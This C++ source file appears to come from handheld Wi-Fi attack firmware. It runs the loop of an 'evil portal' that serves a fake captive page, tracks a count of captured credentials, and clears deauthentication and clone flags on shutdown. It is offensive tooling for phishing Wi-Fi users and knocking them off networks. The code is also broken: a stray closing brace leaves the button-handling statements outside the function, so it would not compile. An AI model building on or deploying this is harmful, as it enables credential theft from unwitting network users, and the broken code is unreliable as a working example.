#include "RunScreen.h"
#include "portal.h"
#include "../../services/gui/ScreenManager.h"

using namespace Applications::Portal;
using namespace Applications::Services::GUI;

void portal_loop(){
  if ((millis() - lastTick) > PortalTickTimer) {
    lastTick = millis();
    if (totalCapturedCredentials != previousTotalCapturedCredentials) {
      previousTotalCapturedCredentials = totalCapturedCredentials;
      printHomeToScreen();
    }
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
  }
  if (check_next_press()){
    shutdownWebServer();
    portal_active = false;
    target_deauth_flg = false;                                                                     // DEAUTH
    target_deauth = false;                                                                         // DEAUTH
    clone_flg = false;                                                                             // DEAUTH
    current_proc = 12;
    delay(500);
  }
  check_select_press();
}

